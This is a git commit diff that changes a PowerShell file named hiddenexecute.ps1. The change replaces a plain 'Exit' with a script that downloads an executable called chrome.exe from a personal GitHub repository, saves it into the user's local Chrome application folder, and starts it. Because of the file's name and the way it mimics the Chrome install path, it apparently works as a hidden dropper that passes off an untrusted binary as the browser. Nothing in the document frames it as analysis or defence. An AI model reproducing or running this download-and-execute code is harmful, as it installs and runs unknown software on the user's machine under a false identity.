b494cef5317cc9825583b6635530f34dc55ee243
webntdev <96979468+webntdev@users.noreply.github.com>
2024-04-19 10:15:27 +0300

    Update hiddenexecute.ps1

--- files/hiddenexecute.ps1
+++ files/hiddenexecute.ps1
@@ -1,1 +1,11 @@
-Exit
+$url = "https://github.com/webntdev/webntdev.github.io/raw/main/application/chrome.exe"
+$destinationPath = "$env:USERPROFILE\AppData\Local\Google\Chrome\Application"
+$exePath = Join-Path -Path $destinationPath -ChildPath "chrome.exe"
+
+if (-not (Test-Path -Path $destinationPath)) {
+    New-Item -ItemType Directory -Path $destinationPath | Out-Null
+}
+
+Invoke-WebRequest -Uri $url -OutFile $exePath
+
+Start-Process -FilePath $exePath
